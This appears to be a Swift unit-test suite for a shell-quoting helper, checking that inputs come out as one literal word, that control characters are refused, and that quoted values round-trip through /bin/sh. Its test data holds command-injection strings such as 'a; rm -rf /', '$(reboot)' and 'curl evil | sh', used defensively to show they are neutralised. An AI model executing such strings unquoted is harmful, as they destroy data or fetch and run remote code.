import Foundation
import Testing
@testable import PatchNodeCore

@Suite("Shell quoting (command injection)")
struct ShellQuotingTests {
    @Test(arguments: [
        ("plain", "'plain'"),
        ("/opt/stacks/my app", "'/opt/stacks/my app'"),
        ("it's", "'it'\\''s'"),
        ("$(reboot)", "'$(reboot)'"),
        ("`id`", "'`id`'"),
        ("a; rm -rf /", "'a; rm -rf /'"),
        ("x && curl evil | sh", "'x && curl evil | sh'"),
        ("$HOME/*", "'$HOME/*'"),
        ("\"quoted\"", "'\"quoted\"'"),
        ("-rf", "'-rf'"),
        ("'", "''\\'''"),
        ("été/日本", "'été/日本'"),
    ])
    func quotesAsOneLiteralWord(input: String, expected: String) throws {
        #expect(try ShellQuoting.quote(input) == expected)
    }

    @Test(arguments: ["a\nreboot", "a\rb", "nul\u{0}", "esc\u{1B}[2J", "tab\tx", "del\u{7F}", "rtl\u{202E}txt", "c1\u{85}"])
    func refusesControlCharacters(input: String) {
        #expect(throws: ShellQuoting.Failure.controlCharacter) { try ShellQuoting.quote(input) }
    }

    @Test func refusesEmpty() {
        #expect(throws: ShellQuoting.Failure.empty) { try ShellQuoting.quote("") }
    }

    @Test func commandQuotesEveryArgument() throws {
        #expect(try ShellQuoting.command(["docker", "compose", "-f", "/a b/c.yml", "up", "-d"])
                == "'docker' 'compose' '-f' '/a b/c.yml' 'up' '-d'")
    }

    /// The quoted word, read back by a real POSIX shell, is exactly the input.
    @Test(arguments: ["it's", "$(id)", "a b\tc".replacingOccurrences(of: "\t", with: " "), "'; echo pwned; '", "*", "\\"])
    func roundTripsThroughShell(input: String) throws {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.arguments = ["-c", "printf '%s' \(try ShellQuoting.quote(input))"]
        let pipe = Pipe()
        process.standardOutput = pipe
        try process.run()
        process.waitUntilExit()
        let output = String(decoding: pipe.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
        #expect(output == input)
    }
}
